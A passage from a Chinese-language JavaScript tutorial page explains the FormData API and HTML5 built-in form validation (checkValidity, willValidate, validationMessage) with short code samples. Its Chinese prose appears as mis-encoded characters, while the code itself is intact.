</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>FormData()</code>æ„é€ å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªè¡¨å•å…ƒç´ ï¼Œè¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ã€‚å¦‚æœçœç•¥å‚æ•°ï¼Œå°±è¡¨ç¤ºä¸€ä¸ªç©ºçš„è¡¨å•ï¼Œå¦åˆ™å°±ä¼šå¤„ç†è¡¨å•å…ƒç´ é‡Œé¢çš„é”®å€¼å¯¹ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªè¡¨å•ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>myForm<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>myForm<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç”¨æˆ·åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>useracc<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>è´¦å·ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>useracc<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>useracc<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>userfile<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ä¸Šä¼ æ–‡ä»¶ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>userfile<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>userfile<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>Submit!<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>æˆ‘ä»¬ç”¨ FormData å¯¹è±¡å¤„ç†ä¸Šé¢è¿™ä¸ªè¡¨å•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> myForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>myForm<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// è·å–æŸä¸ªæ§ä»¶çš„å€¼</span>
formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token comment">// &quot;&quot;</span>

<span class="token comment">// è®¾ç½®æŸä¸ªæ§ä»¶çš„å€¼</span>
formData<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'å¼ ä¸‰'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token comment">// &quot;å¼ ä¸‰&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="å®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹æ–¹æ³•" class="header-anchor">#</a> å®ä¾‹æ–¹æ³•</h3> <p>FormData æä¾›ä»¥ä¸‹å®ä¾‹æ–¹æ³•ã€‚</p> <ul><li><code>FormData.get(key)</code>ï¼šè·å–æŒ‡å®šé”®åå¯¹åº”çš„é”®å€¼ï¼Œå‚æ•°ä¸ºé”®åã€‚å¦‚æœæœ‰å¤šä¸ªåŒåçš„é”®å€¼å¯¹ï¼Œåˆ™è¿”å›ç¬¬ä¸€ä¸ªé”®å€¼å¯¹çš„é”®å€¼ã€‚</li> <li><code>FormData.getAll(key)</code>ï¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºæŒ‡å®šé”®åå¯¹åº”çš„æ‰€æœ‰é”®å€¼ã€‚å¦‚æœæœ‰å¤šä¸ªåŒåçš„é”®å€¼å¯¹ï¼Œæ•°ç»„ä¼šåŒ…å«æ‰€æœ‰çš„é”®å€¼ã€‚</li> <li><code>FormData.set(key, value)</code>ï¼šè®¾ç½®æŒ‡å®šé”®åçš„é”®å€¼ï¼Œå‚æ•°ä¸ºé”®åã€‚å¦‚æœé”®åä¸å­˜åœ¨ï¼Œä¼šæ·»åŠ è¿™ä¸ªé”®å€¼å¯¹ï¼Œå¦åˆ™ä¼šæ›´æ–°æŒ‡å®šé”®åçš„é”®å€¼ã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ–‡ä»¶åã€‚</li> <li><code>FormData.delete(key)</code>ï¼šåˆ é™¤ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå‚æ•°ä¸ºé”®åã€‚</li> <li><code>FormData.append(key, value)</code>ï¼šæ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹ã€‚å¦‚æœé”®åé‡å¤ï¼Œåˆ™ä¼šç”Ÿæˆä¸¤ä¸ªç›¸åŒé”®åçš„é”®å€¼å¯¹ã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ–‡ä»¶åã€‚</li> <li><code>FormData.has(key)</code>ï¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…·æœ‰è¯¥é”®åçš„é”®å€¼å¯¹ã€‚</li> <li><code>FormData.keys()</code>ï¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äº<code>for...of</code>å¾ªç¯éå†æ‰€æœ‰çš„é”®åã€‚</li> <li><code>FormData.values()</code>ï¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äº<code>for...of</code>å¾ªç¯éå†æ‰€æœ‰çš„é”®å€¼ã€‚</li> <li><code>FormData.entries()</code>ï¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äº<code>for...of</code>å¾ªç¯éå†æ‰€æœ‰çš„é”®å€¼å¯¹ã€‚å¦‚æœç›´æ¥ç”¨<code>for...of</code>å¾ªç¯éå† FormData å®ä¾‹ï¼Œé»˜è®¤å°±ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚</li></ul> <p>ä¸‹é¢æ˜¯<code>get()</code>ã€<code>getAll()</code>ã€<code>set()</code>ã€<code>append()</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

formData<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'å¼ ä¸‰'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'æå››'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token comment">// &quot;å¼ ä¸‰&quot;</span>
formData<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token comment">// [&quot;å¼ ä¸‰&quot;, &quot;æå››&quot;]</span>

formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'userpic[]'</span><span class="token punctuation">,</span> myFileInput<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'user1.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'userpic[]'</span><span class="token punctuation">,</span> myFileInput<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'user2.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>ä¸‹é¢æ˜¯éå†å™¨çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">,</span> <span class="token string">'value1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'key2'</span><span class="token punctuation">,</span> <span class="token string">'value2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">of</span> formData<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// &quot;key1&quot;</span>
<span class="token comment">// &quot;key2&quot;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> value <span class="token keyword">of</span> formData<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// &quot;value1&quot;</span>
<span class="token comment">// &quot;value2&quot;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> pair <span class="token keyword">of</span> formData<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// key1: value1</span>
<span class="token comment">// key2: value2</span>

<span class="token comment">// ç­‰åŒäºéå† formData.entries()</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> pair <span class="token keyword">of</span> formData<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// key1: value1</span>
<span class="token comment">// key2: value2</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h2 id="_3-è¡¨å•çš„å†…ç½®éªŒè¯"><a href="#_3-è¡¨å•çš„å†…ç½®éªŒè¯" class="header-anchor">#</a> 3.è¡¨å•çš„å†…ç½®éªŒè¯</h2> <h3 id="è‡ªåŠ¨æ ¡éªŒ"><a href="#è‡ªåŠ¨æ ¡éªŒ" class="header-anchor">#</a> è‡ªåŠ¨æ ¡éªŒ</h3> <p>è¡¨å•æäº¤çš„æ—¶å€™ï¼Œæµè§ˆå™¨å…è®¸å¼€å‘è€…æŒ‡å®šä¸€äº›æ¡ä»¶ï¼Œå®ƒä¼šè‡ªåŠ¨éªŒè¯å„ä¸ªè¡¨å•æ§ä»¶çš„å€¼æ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- å¿…å¡« --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- å¿…é¡»ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>banana|cherry<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»ä¸º6ä¸ªå­—ç¬¦ --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">minlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>6<span class="token punctuation">&quot;</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>6<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- æ•°å€¼å¿…é¡»åœ¨1åˆ°10ä¹‹é—´ --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>number<span class="token punctuation">&quot;</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>1<span class="token punctuation">&quot;</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>10<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- å¿…é¡»å¡«å…¥ Email åœ°å€ --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>email<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- å¿…é¡»å¡«å…¥ URL --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>URL<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>å¦‚æœä¸€ä¸ªæ§ä»¶é€šè¿‡éªŒè¯ï¼Œå®ƒå°±ä¼šåŒ¹é…<code>:valid</code>çš„ CSS ä¼ªç±»ï¼Œæµè§ˆå™¨ä¼šç»§ç»­è¿›è¡Œè¡¨å•æäº¤çš„æµç¨‹ã€‚å¦‚æœæ²¡æœ‰é€šè¿‡éªŒè¯ï¼Œè¯¥æ§ä»¶å°±ä¼šåŒ¹é…<code>:invalid</code>çš„ CSS ä¼ªç±»ï¼Œæµè§ˆå™¨ä¼šç»ˆæ­¢è¡¨å•æäº¤ï¼Œå¹¶æ˜¾ç¤ºä¸€ä¸ªé”™è¯¯ä¿¡æ¯ã€‚</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">input:invalid</span> <span class="token punctuation">{</span>
  <span class="token property">border-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">input,
input:valid</span> <span class="token punctuation">{</span>
  <span class="token property">border-color</span><span class="token punctuation">:</span> #ccc<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="checkvalidity"><a href="#checkvalidity" class="header-anchor">#</a> checkValidity()</h3> <p>é™¤äº†æäº¤è¡¨å•çš„æ—¶å€™ï¼Œæµè§ˆå™¨è‡ªåŠ¨æ ¡éªŒè¡¨å•ï¼Œè¿˜å¯ä»¥æ‰‹åŠ¨è§¦å‘è¡¨å•çš„æ ¡éªŒã€‚è¡¨å•å…ƒç´ å’Œè¡¨å•æ§ä»¶éƒ½æœ‰<code>checkValidity()</code>æ–¹æ³•ï¼Œç”¨äºæ‰‹åŠ¨è§¦å‘æ ¡éªŒã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è§¦å‘æ•´ä¸ªè¡¨å•çš„æ ¡éªŒ</span>
form<span class="token punctuation">.</span><span class="token function">checkValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// è§¦å‘å•ä¸ªè¡¨å•æ§ä»¶çš„æ ¡éªŒ</span>
formControl<span class="token punctuation">.</span><span class="token function">checkValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>checkValidity()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œ<code>true</code>è¡¨ç¤ºé€šè¿‡æ ¡éªŒï¼Œ<code>false</code>è¡¨ç¤ºæ²¡æœ‰é€šè¿‡æ ¡éªŒã€‚å› æ­¤ï¼Œæäº¤è¡¨å•å¯ä»¥å°è£…ä¸ºä¸‹é¢çš„å‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">submitForm</span><span class="token punctuation">(</span><span class="token parameter">action</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  form<span class="token punctuation">.</span>action <span class="token operator">=</span> action<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>form<span class="token punctuation">.</span><span class="token function">checkValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="willvalidate-å±æ€§"><a href="#willvalidate-å±æ€§" class="header-anchor">#</a> willValidate å±æ€§</h3> <p>æ§ä»¶å…ƒç´ çš„<code>willValidate</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¯¥æ§ä»¶æ˜¯å¦ä¼šåœ¨æäº¤æ—¶è¿›è¡Œæ ¡éªŒã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;form novalidate&gt;</span>
<span class="token comment">//   &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;</span>
<span class="token comment">// &lt;/form&gt;</span>

<span class="token keyword">var</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
input<span class="token punctuation">.</span>willValidate <span class="token comment">// true</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="validationmessage-å±æ€§"><a href="#validationmessage-å±æ€§" class="header-anchor">#</a> validationMessage å±æ€§</h3> <p>æ§ä»¶å…ƒç´ çš„<code>validationMessage</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ§ä»¶ä¸æ»¡è¶³æ ¡éªŒæ¡ä»¶æ—¶ï¼Œæµè§ˆå™¨æ˜¾ç¤ºçš„æç¤ºæ–‡æœ¬ã€‚ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼Œè¯¥å±æ€§è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</p> <ul><li>è¯¥æ§ä»¶ä¸ä¼šåœ¨æäº¤æ—¶è‡ªåŠ¨æ ¡éªŒ</li> <li>è¯¥æ§ä»¶æ»¡è¶³æ ¡éªŒæ¡ä»¶</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;</span>
document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'form input'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>validationMessage
<span class="token comment">// &quot;è¯·å¡«å†™æ­¤å­—æ®µã€‚&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> myInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myinput'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>myInput<span class="token punctuation">.</span><span class="token function">checkValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'prompt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> myInput<span class="token punctuation">.</span>validationMessage<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

